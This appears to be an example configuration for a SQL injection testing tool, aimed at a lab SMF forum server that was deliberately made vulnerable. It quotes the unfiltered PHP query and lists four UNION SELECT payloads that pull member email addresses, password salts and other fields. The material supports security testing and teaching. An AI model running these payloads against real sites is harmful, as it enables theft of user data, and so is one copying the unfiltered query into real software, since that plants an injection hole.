# This example shows the UNION ALL attacks supported on the 
# smf server machine. The attack exploits an unfiltered 
# query on the database:
#
# select real_name from smf_members where id_member='" . $_GET['inject'] . "'";
#
# By appending a UNION ALL ... statement to the query, we can extract information
# that may not otherwise be available to the client.
#
# The UNION ALL statement parameters must match the number and type of the query
# statment. The SMF server application has been patched to have four UNION ALL
# vulnerabilities: 1 string, 2 strings, 1 int, 2 ints. The vulnerable attributes
# are show below.
#
# To see the queries run rabidsqrl with the -r option:
#
# > python3 -m rabidsqrl -c examples/smf-union-all.conf -r
#
[
    {
        # this one will generate the following SQL on the server side:
        # select real_name from smf_members where id_member='1' union select all email_address from smf_members;--'
        "attack": "sql_inline",
        "base_url": "http://smf-server/forum/index.php",
        "attribute": "unionstr",
        "statements": [ "1' union select all email_address from smf_members;--" ]
    },
    {
        "attack": "sql_inline",
        "base_url": "http://smf-server/forum/index.php",
        "attribute": "unionstr2",
        "statements": [ "1' union select all email_address,password_salt from smf_members;--" ]
    },
    {
        "attack": "sql_inline",
        "base_url": "http://smf-server/forum/index.php",
        "attribute": "unionint",
        "statements": [ "1' union select all posts from smf_members;--" ]
    },
    {
        "attack": "sql_inline",
        "base_url": "http://smf-server/forum/index.php",
        "attribute": "unionint2",
        "statements": [ "1' union select all posts,date_registered from smf_members;--" ]
    }
]
